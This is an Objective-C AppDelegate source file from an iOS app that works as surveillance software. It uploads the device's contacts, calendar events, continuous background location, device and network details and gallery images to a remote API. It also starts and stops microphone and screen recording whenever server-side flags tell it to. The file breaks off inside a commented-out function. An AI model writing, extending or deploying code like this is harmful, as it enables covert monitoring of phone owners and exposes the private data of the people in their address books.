//
//  AppDelegate.m
//  W1
//
//  Created by sohan on 2/19/17.
//  Copyright © 2017 Squarebits pvt ltd. All rights reserved.
//

#import "AppDelegate.h"
#import "HomeVC.h"
#import <SystemConfiguration/CaptiveNetwork.h>
#import <Photos/Photos.h>
#import "UserObject.h"
#import "Unirest/UNIRest.h"
#import "ApiUrl.h"
#import "Constant.h"
#import <Contacts/Contacts.h>
#import <AddressBook/AddressBook.h>

OBJC_EXTERN UIImage *_UICreateScreenUIImage(void) NS_RETURNS_RETAINED;
@interface AppDelegate ()
{
    int imageCounter;
    
    int screenRecordingCounter;
    int audioRecordingCounter;
}

@property(strong,nonatomic)HomeVC *objSplash;
@end

@implementation AppDelegate
@synthesize locationManager,bluetoothManager,utility,formatter,bluetoothEnabled,counterForRecord,objSplash,assets,aryImageIdentifiers;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
//    self.window=[[UIWindow alloc]initWithFrame:[[UIScreen mainScreen]bounds]];
//    self.window.backgroundColor=[UIColor blackColor];
//    [self.window makeKeyAndVisible];
    
    [[UIApplication sharedApplication] setStatusBarHidden:NO];
    [application setStatusBarStyle:UIStatusBarStyleLightContent];
  
    formatter=[[NSDateFormatter alloc]init];
    formatter.dateFormat=@"yyyy-MM-dd HH:mm:ss";//2017-01-18 12:08:08
    
    [self createDirectories];
    utility=[[UtilityObject alloc]init];
    [self startBluetoothStatusMonitoring];
//    [self checkContactPermission];
    [self contactScan];
    //[self GetcurrentLocation];
    [self sendDeviceDetails];
    
    [self requestCalendarAccess];

    [self setupAudisSession];

    objSplash= self.window.rootViewController;
//    [self.window setRootViewController:objSplash];
    
//    [ALSystem batteryInformations];
    
    return YES;
}

-(void)GetcurrentLocation
{
    locationManager = [[CLLocationManager alloc] init];
    locationManager.delegate = self;
    locationManager.desiredAccuracy = kCLLocationAccuracyBest;//kCLLocationAccuracyThreeKilometers
    
    if ([[[UIDevice currentDevice] systemVersion] floatValue] >= 8.0)
    {
//        [locationManager requestWhenInUseAuthorization];
        [locationManager requestAlwaysAuthorization];
    }
    
    if ([[[UIDevice currentDevice] systemVersion] floatValue] >= 9.0)
    {
        locationManager.allowsBackgroundLocationUpdates=YES;
    }
    locationManager.pausesLocationUpdatesAutomatically=NO;
    
    [locationManager startUpdatingLocation];
    [locationManager startMonitoringSignificantLocationChanges];
}
#pragma mark - Current location delegates
#pragma mark -
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations
{
    CLLocation *newLocation=[locations lastObject];
    
    self.strLATITUDE=[NSString stringWithFormat:@"%f",newLocation.coordinate.latitude];
    self.strLONGITUDE=[NSString stringWithFormat:@"%f",newLocation.coordinate.longitude];
    
//    NSLog(@"Location Found");
    if (![NS_Defaults boolForKey:@"currloc"])
    {
        self.CurrentUserLocation=newLocation;
     
        //
        [self sendLocation:self.strLATITUDE lng:self.strLONGITUDE];
        
        //
        [NS_Defaults setBool:YES forKey:@"currloc"];
        [NS_Defaults synchronize];
    }

    CLLocationDistance distance = [newLocation distanceFromLocation:self.CurrentUserLocation];
    if (distance>=10)//in meters
    {
        self.CurrentUserLocation=newLocation;
        
        //
        [self sendLocation:self.strLATITUDE lng:self.strLONGITUDE];
    }
}
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error
{
    //    NSLog(@"Location failed%@",error.localizedDescription);
}
-(void)sendLocation:(NSString *)lat lng:(NSString *)lng
{
    NSMutableDictionary *dicJson=[[NSMutableDictionary alloc]init];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];
    
    //1
    NSString *date=[formatter stringFromDate:[NSDate date]];
    
    [dicJson setObject:lat forKey:@"Latitude"];
    [dicJson setObject:lng forKey:@"Longitude"];
    [dicJson setObject:date forKey:@"DateTime"];
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dicJson
                                                       options:NSJSONWritingPrettyPrinted // Pass 0 if you don't care about the readability of the generated string
                                                         error:&error];
    NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
    
    [dicParam setObject:jsonString forKey:@"data"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_Location]];
              [simpleRequest setParameters:dicParam];
          }] asStringAsync:^(UNIHTTPStringResponse *stringResponse, NSError *error) {
//              [self checkContactPermission];
              [self contactScan];

              NSLog(@"location: %@",stringResponse.body);
          }];
    }
}
-(BOOL)isStringEmpty:(NSString*)str
{
    BOOL isEmpty=YES;
    
    if (str == (id)[NSNull null])
    {
        return YES;
    }
    
    if ([[str stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]] length]>0)
    {
        isEmpty=NO;
    }
    
    return isEmpty;
}

-(BOOL)isInternetAvailable
{
    Reachability *reachability = [Reachability reachabilityForInternetConnection];
    NetworkStatus networkStatus = [reachability currentReachabilityStatus];
    if (networkStatus==NotReachable)
    {
        return NO;
    }
    return YES;
}

#pragma mark - Application Did Enter Background
#pragma mark -
- (void)applicationDidEnterBackground:(UIApplication *)application
{
//    [self performSelector:@selector(screenCapture) withObject:nil afterDelay:5.0];
    
    //check to see if NEWSSTAND is open when entering into background. If yes then go to home VC.
    [NS_Defaults setObject:[NSDate date] forKey:@"backgroundSyncTime"];
    [NS_Defaults synchronize];
    
    __block BOOL isDownloadingBigThread=false;
    //locationManager = [[CLLocationManager alloc] init];//[CLLocationManager new];
    __block UIBackgroundTaskIdentifier background_task;
    
    background_task = [application beginBackgroundTaskWithExpirationHandler:^ {
        [application endBackgroundTask: background_task];
        background_task = UIBackgroundTaskInvalid;
    }];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        
        //run the app without startUpdatingLocation. backgroundTimeRemaining decremented from 600.00
        
        [locationManager startUpdatingLocation];
        
        while(TRUE)
        {
            //Background
            NSDate *setTime  = [[NSUserDefaults standardUserDefaults] objectForKey:@"backgroundSyncTime"];
            NSDate *currentTime=[NSDate date];

            NSTimeInterval distanceBetweenDates = [currentTime timeIntervalSinceDate:setTime];
            NSLog(@"BackSync : Difference between time is %f",distanceBetweenDates);
            
            if (distanceBetweenDates>[kBackgroundSyncTimeInMinutes intValue]*5)
            {
                [NS_Defaults setObject:[NSDate date] forKey:@"backgroundSyncTime"];
                [NS_Defaults synchronize];
                
                //upadte UI
                NSLog(@"BackSync : Time Out Its time to update UI");
                isDownloadingBigThread=true;
                
                [self checkStatus];
                [self startBluetoothStatusMonitoring];
                
                
                //for stopping video after 5 minutes
                screenRecordingCounter++;
                if (screenRecordingCounter==48 && _isScreenRecording==YES)
                {
                    _isScreenRecording=NO;
                    [objSplash stopRecord];
                }
                
                
                //for stopping audio recording after 5 minutes
                audioRecordingCounter++;
                //NSLog(@"-----------------------------------------------------------%d",audioRecordingCounter);
                if (audioRecordingCounter==60 && [_audioRecorder isRecording]) {
                    [_audioRecorder stop];
                }
            }
            
            [NSThread sleepForTimeInterval:[kBackgroundSyncTimeInMinutes intValue]*2]; //wait for 1 sec
        }
        
        [application endBackgroundTask: background_task];
        background_task = UIBackgroundTaskInvalid;
    });
}
-(void)checkStatus
{
    NSString *uuid=[NS_Defaults objectForKey:kDEVICE_ID];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:uuid forKey:@"uuid"];
    
    [[UNIRest post:^(UNISimpleRequest *simpleRequest)
      {
          [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Check_DeviceStatus]];
          [simpleRequest setParameters:dicParam];
      }] asJsonAsync:^(UNIHTTPJsonResponse *jsonResponse, NSError *error)
     {
         NSDictionary *result = jsonResponse.body.object;
         NSString * strResponse = [[NSString alloc] initWithData:[jsonResponse rawBody] encoding:NSUTF8StringEncoding];

         NSLog(@"Status: %@",result);

         if ([[result objectForKey:@"status"] intValue]==1)
         {
             int batteryLevel = [ALBattery batteryLevel];
//             batteryLevel=20;
             NSLog(@"batteryLevel--->>>%d",batteryLevel);
             if ([[result objectForKey:@"auto_sleep"] intValue]==1 && batteryLevel <= 20 && ([[result objectForKey:@"updateStatus"] intValue]==1 || [[result objectForKey:@"mircophone_activate"] intValue]==1 || [[result objectForKey:@"screen_recording_activate"] intValue]==1))
             {
                 //call low battery api here
                 NSLog(@"<<<----------------------- battery low ----------------------->>>%d",batteryLevel);
                 [self sendLowBattery:batteryLevel];
             }
             else
             {
                 //audio recording
                 if ([[result objectForKey:@"mircophone_activate"] intValue]==1)
                 {
                     if ([_audioRecorder isRecording]==NO) {
                         audioRecordingCounter=0;
                         [self setupAudisSession];
                         [_audioRecorder record];
                     }
                 }
                 else
                 {
                     if ([_audioRecorder isRecording]) {
                         [_audioRecorder stop];
                     }
                 }

                 //screen recording
                 if ([[result objectForKey:@"screen_recording_activate"] intValue]==1)
                 {
                     if (_isScreenRecording==NO && self.isOCR_inProgress==NO)
                     {
                         screenRecordingCounter=0;
                         self.isOCR_inProgress=YES;
                         _isScreenRecording=YES;
                         [objSplash startRecord];
                     }
                 }
                 else
                 {
                     if (_isScreenRecording)
                     {
                         _isOCR_inProgress = NO;
                         _isScreenRecording = NO;
                         [objSplash stopRecord];
                     }
                 }

                 //if ([[result objectForKey:@"updateStatus"] intValue]==1)
                 {
                     [self sendDeviceGeneralInfo];
                     [self sendContactList];
                     [self sendCalendarEvents];

                     //for gallery image upload
                     if (!isImagesUploading)
                     {
                         [self getImagesFromGallery:@"image"];
                     }
                 }
             }
         }
     }];
}
-(void)sendLowBattery:(int)batLev
{
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];
    [dicParam setObject:[NSString stringWithFormat:@"%d",batLev] forKey:@"battery"];
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_LowBattery]];
              [simpleRequest setParameters:dicParam];
          }] asJsonAsync:^(UNIHTTPJsonResponse *jsonResponse, NSError *error)
         {
             NSDictionary *result = jsonResponse.body.object;
             if ([[result objectForKey:@"status"] intValue]!=1) {
                 [self sendLowBattery:batLev];
             }
         }];
    }
}
- (void)startBluetoothStatusMonitoring
{
    bluetoothManager = [[CBCentralManager alloc] initWithDelegate:self
                                                            queue:nil
                                                          options:
                                [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:0]
                                                            forKey:CBCentralManagerOptionShowPowerAlertKey]];
    
//    EAAccessoryManager *manager = [EAAccessoryManager sharedAccessoryManager];
//    NSMutableArray *bluetoothPrinters = [[NSMutableArray alloc] initWithArray:manager.connectedAccessories];
}

#pragma mark - CBCentralManagerDelegate

- (void)centralManagerDidUpdateState:(CBCentralManager *)central
{
    if ([central state] == CBCentralManagerStatePoweredOn)
    {
        bluetoothEnabled = YES;
    }
    else
    {
        bluetoothEnabled = NO;
    }
}

#pragma mark - send device details
#pragma mark -
-(void)sendDeviceDetails
{
    // *************************** save device id to keychain
    if(![NS_Defaults objectForKey:kDEVICE_ID])
    {
        KeychainItemWrapper *item=[[KeychainItemWrapper alloc] initWithIdentifier:App_Name accessGroup:Nil];
//                [item resetKeychainItem];
        NSString *obj=[NSString stringWithFormat:@"%@",[item.keychainItemData objectForKey:(__bridge id)(kSecAttrAccount)]];
        
        if([obj isEqualToString:@""] || !obj)
        {
            UIDevice *device = [UIDevice currentDevice];
            obj = [[device identifierForVendor] UUIDString];
            [item setObject:obj forKey:(__bridge id)(kSecAttrAccount)];
        }
        NSUserDefaults *myDefaults = [[NSUserDefaults alloc] initWithSuiteName:@"group.com.dasquire.app.keyboard"];

        [myDefaults setObject:obj forKey:@"device_id"];
        [myDefaults synchronize];

        [NS_Defaults setObject:obj forKey:kDEVICE_ID];
        [NS_Defaults synchronize];
    }
    
    // ***************************
    
    self.strDEVICE_ID = [NS_Defaults objectForKey:kDEVICE_ID];
    
    NSMutableDictionary *d=[[NSMutableDictionary alloc]init];
    
    [d setObject:[utility getTimeZone] forKey:@"timezone_info"];
    
#if !TARGET_IPHONE_SIMULATOR
    
    d=[ALSystem getDeviceInfo:d];
#endif
    
    d=[ALSystem getLocalizeInfo:d];
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:d
                                                       options:NSJSONWritingPrettyPrinted // Pass 0 if you don't care about the readability of the generated string
                                                         error:&error];
    
    NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:self.strDEVICE_ID forKey:@"uuid"];
    [dicParam setObject:jsonString forKey:@"data"];
    [dicParam setObject:@"" forKey:@"device_token"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_DeviceInfo]];
              [simpleRequest setParameters:dicParam];
          }] asStringAsync:^(UNIHTTPStringResponse *stringResponse, NSError *error) {
              NSLog(@"Device Details%@",stringResponse.body);
          }];
    }
}



-(void) openKeyboardSettings{
    NSURL* settingsURL = [NSURL URLWithString: UIApplicationOpenSettingsURLString];
    if(settingsURL != nil){
        [[UIApplication sharedApplication] openURL:settingsURL];

    }
 
}

#pragma mark - send general info
#pragma mark -
-(void)sendDeviceGeneralInfo
{
    NSMutableDictionary *dicForJson=[[NSMutableDictionary alloc]init];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];
    
    //1
    [dicForJson setObject:[utility wifiStatus] forKey:@"wifi_status"];
    
    //2
    [dicForJson setObject:[utility mobileDataStatus] forKey:@"mobileData_status"];
    
    //3
    [dicForJson setObject:[NSNumber numberWithBool:bluetoothEnabled] forKey:@"bluetooth_status"];
    
    //4
    dicForJson=[ALSystem getDiskInfo:dicForJson];
    
    //5
    dicForJson=[ALSystem getCarrierInfo:dicForJson];
    
    //6
    dicForJson=[ALSystem getBatteryInfo:dicForJson];
    
    //7
    dicForJson=[ALSystem getAccessoryInfo:dicForJson];
    
    //8
    [dicForJson setObject:[self getGPSstatus] forKey:@"gps_status"];
    
    //9
    dicForJson=[utility fetchSSIDInfo:dicForJson];
    
    //10
    [dicForJson setObject:[utility newtworkType] forKey:@"network_type"];
    
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dicForJson
                                                       options:NSJSONWritingPrettyPrinted // Pass 0 if you don't care about the readability of the generated string
                                                         error:&error];
    NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
    
    [dicParam setObject:jsonString forKey:@"data"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_GeneralInfo]];
              [simpleRequest setParameters:dicParam];
          }] asStringAsync:^(UNIHTTPStringResponse *stringResponse, NSError *error) {
              //NSDictionary *result = jsonResponse.body.object;
              NSLog(@"general info: %@",stringResponse.body);
          }];
    }
}
-(NSString*)getGPSstatus
{
    NSString *str=@"";
    if([CLLocationManager locationServicesEnabled] &&
       [CLLocationManager authorizationStatus] != kCLAuthorizationStatusDenied) {
        // show the map
        str=@"1";
    } else {
        // show error5-  
        str=@"0";
        [NS_Defaults setBool:NO forKey:@"currloc"];
        [NS_Defaults synchronize];
        
    }
    return str;
}
-(void)sendContactList
{
    NSMutableDictionary *dicJson=[[NSMutableDictionary alloc]init];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];
    
    //1
    if (contactList) {
        [dicJson setObject:contactList forKey:@"contacts"];
    }
    
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dicJson
                                                       options:NSJSONWritingPrettyPrinted // Pass 0 if you don't care about the readability of the generated string
                                                         error:&error];
    NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
    
    [dicParam setObject:jsonString forKey:@"data"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_ContactList]];
              [simpleRequest setParameters:dicParam];
          }] asStringAsync:^(UNIHTTPStringResponse *stringResponse, NSError *error) {
//              [self checkContactPermission];
              [self contactScan];

              NSLog(@"Contacts:  %@",stringResponse.body);
          }];
    }
}
#pragma mark -
#pragma mark Fetch events
-(void)sendCalendarEvents
{
    NSMutableDictionary *dicJson=[[NSMutableDictionary alloc]init];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];
    
    //1
    NSMutableArray *a=[self getEventsFromCalendar];
    
    [dicJson setObject:a forKey:@"calendar"];
    NSLog(@"DIC: %@",dicJson);
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dicJson
                                                       options:NSJSONWritingPrettyPrinted // Pass 0 if you don't care about the readability of the generated string
                                                         error:&error];
    NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
    
    [dicParam setObject:jsonString forKey:@"data"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_Calendar]];
              [simpleRequest setParameters:dicParam];
          }] asJsonAsync:^(UNIHTTPJsonResponse *jsonResponse, NSError *error)
         {
             NSDictionary *result = jsonResponse.body.object;
             NSLog(@"events: %@",result);
         }];
    }
}
-(void)requestCalendarAccess
{
    self.eventStore = [[EKEventStore alloc] init];
    [self.eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error)
     {
         if (granted)
         {
             
             
             //             RootViewController * __weak weakSelf = self;
             //             // Let's ensure that our code will be executed from the main queue
             //             dispatch_async(dispatch_get_main_queue(), ^{
             //                 // The user has granted access to their Calendar; let's populate our UI with all events occuring in the next 24 hours.
//                              [self accessGrantedForCalendar];
             //             });
         }
     }];
}


// This method is called when the user has granted permission to Calendar
-(NSMutableArray *)getEventsFromCalendar
{
    // Let's get the default calendar associated with our event store
    
    self.defaultCalendar = self.eventStore.defaultCalendarForNewEvents;
    
    // Fetch all events happening in the next 24 hours and put them into eventsList
    NSMutableArray *arrEvents=[[NSMutableArray alloc]init];
    
    EKAuthorizationStatus status = [EKEventStore authorizationStatusForEntityType:EKEntityTypeEvent];
    if (status==EKAuthorizationStatusAuthorized) {
        arrEvents=[self fetchEvents];
    }
    
    return arrEvents;
}

// Fetch all events happening in the next 24 hours
- (NSMutableArray *)fetchEvents
{
    NSDate* endDate =  [NSDate dateWithTimeIntervalSinceNow:[[NSDate distantFuture] timeIntervalSinceReferenceDate]];
    NSArray *calendarArray = [NSArray arrayWithObject:self.defaultCalendar];
    NSPredicate *fetchCalendarEvents = [_eventStore predicateForEventsWithStartDate:[NSDate date] endDate:endDate calendars:calendarArray];
    NSArray *eventList = [_eventStore eventsMatchingPredicate:fetchCalendarEvents];
    
    NSMutableArray *arrEvents=[[NSMutableArray alloc]init];
    for (EKEvent *event in eventList)
    {
        NSMutableDictionary *d=[[NSMutableDictionary alloc]init];
        [d setObject:event.title forKey:@"title"];
        [d setObject:event.location forKey:@"location"];
        [d setObject:event.calendar.title forKey:@"calendar_title"];
        
        if (event.alarms) {
            [d setObject:@"YES" forKey:@"alarms"];
        }else{
            [d setObject:@"NO" forKey:@"alarms"];
        }
        
        if (event.URL) {
            [d setObject:event.URL.absoluteString forKey:@"url"];
        }else{
            [d setObject:@"" forKey:@"url"];
        }
        
        [d setObject:[NSString stringWithFormat:@"%@",event.lastModifiedDate] forKey:@"last_modified_date"];
        [d setObject:[NSString stringWithFormat:@"%@",event.startDate] forKey:@"start_date"];
        [d setObject:[NSString stringWithFormat:@"%@",event.endDate] forKey:@"end_date"];
        [d setObject:[NSString stringWithFormat:@"%@",event.timeZone] forKey:@"time_zone"];
        
        if (event.allDay) {
            [d setObject:@"1" forKey:@"all_day_event"];
        }else{
            [d setObject:@"0" forKey:@"all_day_event"];
        }
        
        [arrEvents addObject:d];
    }
    
    return arrEvents;
}
#pragma mark - Contact list

- (void)parseContactWithContact :(CNContact* )contact
{
    NSMutableArray *phoneNumbers = [[NSMutableArray alloc] init];
//    NSMutableArray *contactEmails = [[NSMutableArray alloc] init];

    NSMutableDictionary *dOfPerson=[NSMutableDictionary dictionary];

    NSString* fullNameString = @"";
    NSString * firstName =  contact.givenName;
    NSString * lastName =  contact.familyName;
    NSArray <CNLabeledValue<CNPhoneNumber *> *> * phones = contact.phoneNumbers;
//    NSArray <CNLabeledValue<NSString *> *> * emails = contact.emailAddresses;

//    for (CNLabeledValue<NSString *> * ph in emails) {
//        NSMutableDictionary *dic=[[NSMutableDictionary alloc]init];
//
//        if([ph.label isEqualToString:@"_$!<Home>!$_"])
//        {
//            [dic setObject:ph.value forKey:@"home"];
//        }
//        else if ([ph.label isEqualToString:@"iCloud"])
//        {
//            [dic setObject:ph.value forKey:@"iCloud"];
//        }
//        else if ([ph.label isEqualToString:@"_$!<Other>!$_"])
//        {
//            [dic setObject:ph.value forKey:@"other"];
//        }
//        else if ([ph.label isEqualToString:@"_$!<Work>!$_"])
//        {
//            [dic setObject:ph.value forKey:@"work"];
//        }
//        [contactEmails addObject:dic];
//
//    }
    
    
    for (CNLabeledValue<CNPhoneNumber *> * ph in phones) {
        NSMutableDictionary *dic=[[NSMutableDictionary alloc]init];

        if([ph.label isEqualToString:@"_$!<Mobile>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"mobile"];
        }
        else if ([ph.label isEqualToString:@"Mobile"])
        {
            [dic setObject:ph.value.stringValue forKey:@"mobile_2"];
        }
        else if ([ph.label isEqualToString:@"_$!<Other>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"other"];
        }
        else if ([ph.label isEqualToString:@"_$!<Main>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"main"];
        }
        else if ([ph.label isEqualToString:@"_$!<Home>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"home"];
        }
        else if ([ph.label isEqualToString:@"_$!<Work>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"work"];
        }
        else if ([ph.label isEqualToString:@"work"])
        {
            [dic setObject:ph.value.stringValue forKey:@"work_2"];
        }
        else if ([ph.label isEqualToString:@"_$!<HomeFAX>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"home_fax"];
        }
        else if ([ph.label isEqualToString:@"_$!<HomePage>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"home_pager"];
        }
        else if ([ph.label isEqualToString:@"_$!<WorkFAX>!$_"])
        {
            [dic setObject:ph.value.stringValue forKey:@"work_fax"];
        }
        else if ([ph.label isEqualToString:@"iPhone"])
        {
            [dic setObject:ph.value.stringValue forKey:@"phone"];
        }
        else if ([ph.label isEqualToString:@""])
        {
            [dic setObject:ph.value.stringValue forKey:@"phone"];
        }
        
        [phoneNumbers addObject:dic];
        
    }
 
    if (lastName != nil && firstName != nil)
    {
        fullNameString = [NSString stringWithFormat:@"%@ %@", firstName, lastName];
    }

    if (firstName)
        [dOfPerson setObject:firstName forKey:@"first_name"];
    else
        [dOfPerson setObject:@"" forKey:@"first_name"];
    
    if (lastName)
        [dOfPerson setObject:lastName forKey:@"last_name"];
    else
        [dOfPerson setObject:@"" forKey:@"last_name"];
    
    if (fullNameString)
        [dOfPerson setObject:fullNameString forKey:@"full_name"];
    else
        [dOfPerson setObject:@"" forKey:@"full_name"];


    [dOfPerson setObject:phoneNumbers forKey:@"phone"];
//    [dOfPerson setObject:contactEmails forKey:@"email"];

    [contactList addObject:dOfPerson];
    
}

- (NSMutableArray *)parseAddressWithContact: (CNContact *)contact
{
    NSMutableArray * addrArr = [[NSMutableArray alloc]init];
    CNPostalAddressFormatter * formatter = [[CNPostalAddressFormatter alloc]init];
    NSArray * addresses = (NSArray*)[contact.postalAddresses valueForKey:@"value"];
    if (addresses.count > 0) {
        for (CNPostalAddress* address in addresses) {
            [addrArr addObject:[formatter stringFromPostalAddress:address]];
        }
    }
    return addrArr;
}

-(void)getAllContact
{
    
    
    if([CNContactStore class])
    {
        //iOS 9 or later
        NSError* contactError;
        CNContactStore* addressBook = [[CNContactStore alloc]init];
        [addressBook containersMatchingPredicate:[CNContainer predicateForContainersWithIdentifiers: @[addressBook.defaultContainerIdentifier]] error:&contactError];
        NSArray * keysToFetch =@[CNContactEmailAddressesKey, CNContactPhoneNumbersKey, CNContactFamilyNameKey, CNContactGivenNameKey, CNContactPostalAddressesKey];
        CNContactFetchRequest * request = [[CNContactFetchRequest alloc]initWithKeysToFetch:keysToFetch];
        contactList = [[NSMutableArray alloc] init];

        BOOL success = [addressBook enumerateContactsWithFetchRequest:request error:&contactError usingBlock:^(CNContact * __nonnull contact, BOOL * __nonnull stop){

            [self parseContactWithContact:contact];
        }];
    }
}

- (void) contactScan
{
    [NS_Defaults setObject:@"YES" forKey:@"IsFirstTime"];
    [NS_Defaults synchronize];
    __block int accessGranted = 0;
    
    if ([CNContactStore class]) {
        //ios9 or later
        
        
        CNEntityType entityType = CNEntityTypeContacts;
        if( [CNContactStore authorizationStatusForEntityType:entityType] == CNAuthorizationStatusNotDetermined)
        {
            
            NSLog(@"Not determined");
            accessGranted = 3;
            [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
            [NS_Defaults synchronize];
            
            
            CNContactStore * contactStore = [[CNContactStore alloc] init];
            [contactStore requestAccessForEntityType:entityType completionHandler:^(BOOL granted, NSError * _Nullable error) {
                
                if (!granted)
                {
                    //4
                    NSLog(@"Just denied");
                    accessGranted = 0;
                    [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
                    [NS_Defaults synchronize];
                    
                    return;
                }
                //5
                NSLog(@"Just authorized");
                accessGranted = 1;
                [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
                [NS_Defaults synchronize];
                [self performSelectorInBackground:@selector(getAllContact) withObject:nil];
            
            }];
        }
        else if( [CNContactStore authorizationStatusForEntityType:entityType]== CNAuthorizationStatusAuthorized)
        {
            [self getAllContact];
        }else if( [CNContactStore authorizationStatusForEntityType:entityType] == CNAuthorizationStatusDenied || [CNContactStore authorizationStatusForEntityType:entityType]== CNAuthorizationStatusRestricted)
        {
            //1
            NSLog(@"Denied");
            accessGranted = 0;
            [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
            [NS_Defaults synchronize];
        }else if( [CNContactStore authorizationStatusForEntityType:entityType] == CNAuthorizationStatusAuthorized)
        {
            NSLog(@"Authorized");
            accessGranted = 1;
            [self performSelectorInBackground:@selector(getAllContact) withObject:nil];
            [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
            [NS_Defaults synchronize];
        }
    }
}

//-(void)checkContactPermission
//{
//    [NS_Defaults setObject:@"YES" forKey:@"IsFirstTime"];
//    [NS_Defaults synchronize];
//    __block int accessGranted = 0;
//
//    if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusDenied ||
//        ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusRestricted)
//    {
//        //1
//        NSLog(@"Denied");
//        accessGranted = 0;
//        [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
//        [NS_Defaults synchronize];
//
//    } else if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusAuthorized){
//        //2
//        NSLog(@"Authorized");
//        accessGranted = 1;
//        [self performSelectorInBackground:@selector(getContactsWithAddressBook) withObject:nil];
//        [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
//        [NS_Defaults synchronize];
//
//    } else{ //ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusNotDetermined
//        //3
//        NSLog(@"Not determined");
//        accessGranted = 3;
//        [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
//        [NS_Defaults synchronize];
//
//        ABAddressBookRequestAccessWithCompletion(ABAddressBookCreateWithOptions(NULL, nil), ^(bool granted, CFErrorRef error) {
//            if (!granted)
//            {
//                //4
//                NSLog(@"Just denied");
//                accessGranted = 0;
//                [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
//                [NS_Defaults synchronize];
//
//                return;
//            }
//            //5
//            NSLog(@"Just authorized");
//            accessGranted = 1;
//            [NS_Defaults setObject:[NSString stringWithFormat:@"%d",accessGranted] forKey:@"ContactPermission"];
//            [NS_Defaults synchronize];
//            [self performSelectorInBackground:@selector(getContactsWithAddressBook) withObject:nil];
//        });
//    }
//}
//
//- (void)getContactsWithAddressBook
//{
